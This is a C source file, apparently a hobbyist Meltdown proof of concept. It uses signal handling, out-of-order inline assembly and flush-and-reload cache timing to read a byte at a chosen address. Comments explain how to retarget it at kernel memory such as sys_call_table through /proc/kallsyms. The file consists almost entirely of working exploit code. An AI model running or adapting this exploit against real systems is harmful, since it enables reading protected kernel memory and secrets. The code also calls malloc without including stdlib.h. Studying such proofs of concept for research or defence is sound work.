#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <x86intrin.h>


#define PAGE_SIZE_SHIFT      (0xC)
#define PAGE_SIZE_SHIFT_STR  "0xC"
#define PAGE_SIZE            (1 << PAGE_SIZE_SHIFT)
#define MAX_CACHE_READ_TICKS (80)


static jmp_buf jbuf;

static void sigsegv_handler(int signo)
{
    siglongjmp(jbuf, 1);
}

int main()
{
    void* address_to_guess_byte = 0;
    //address_to_guess_byte = (void*) 0xffffffff986001e0; // uncomment to test with global address

    // I do tests on sys_call_table. Your current sys_call_table address can be found: sudo cat /proc/kallsyms | grep sys_call_table
    // sys_read address should be first value in sys_call_table.
    // You can find your sys_read address: sudo cat /proc/kallsyms | grep sys_read

    if (address_to_guess_byte == 0) { // testing with local address
        char *local_byte = malloc(1);
        *local_byte = 0xAA;
        address_to_guess_byte = local_byte;
    }

    char *meltdown_buf = malloc(PAGE_SIZE * 256);
    memset(meltdown_buf, 0, PAGE_SIZE * 256); // improves cache side effects detection

    signal(SIGSEGV, sigsegv_handler);

    for (int i = 0; i < 100; i++) {
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&meltdown_buf[i * PAGE_SIZE]); // improves cache side effects detection
        }

        if (sigsetjmp(jbuf, !0) == 0) {
            int *ptr = NULL;
            *ptr = 1; // force SIGSEGV by setting value by NULL pointer
            
            // Force SIGSEGV is not required if address_to_guess_byte is protected

            // The code below should not be executed because of SEISEGV.
            // But don't worry. It most likely will be executed because of out-of-order execution optimizations in Intel CPUs :-)

            // Instructions that Intel CPUs likes to execute out-of-order.
            // Once executed they cause cache heat side effect that can be detected while SIGSEGV handling
            asm __volatile__ (
                "%=:                                  \n"
                "xorq %%rax, %%rax                    \n"
                "movb (%[addr]), %%al                 \n" // this line also causes SIGSEGV if the address is protected
                "shlq $" PAGE_SIZE_SHIFT_STR ", %%rax \n"
                "jz %=b                               \n"
                "movq (%[buf], %%rax, 1), %%rbx       \n"
                : 
                :  [addr] "r" (address_to_guess_byte), [buf] "r" (meltdown_buf)
                : "%rax", "%rbx");

            printf("you should never see this line because of SIGSEGV above\n");
        } else { // else branch is executed on SIGSEGV
            static unsigned long ticks[256];
            static volatile char junk;

            // measure access ticks to each page in the buffer
            for (int i = 0; i < 256; i++) {
                _mm_mfence();
                _mm_lfence();
                register unsigned long time = __rdtsc();
                junk = meltdown_buf[PAGE_SIZE * i];
                _mm_lfence();
                ticks[i] = __rdtsc() - time;
                _mm_clflush(&meltdown_buf[PAGE_SIZE * i]);
            }

            for (int i = 0; i < 256; i++) {
                if (ticks[i] < MAX_CACHE_READ_TICKS) { // reading cached page takes less CPU ticks then reading not cached one
                    // if the page is in the cache then the corresponding page shift is most likely the byte value we are guessing
                    printf("guessed byte: 0x%X\n", i);
                }
            }
        }
    }
}
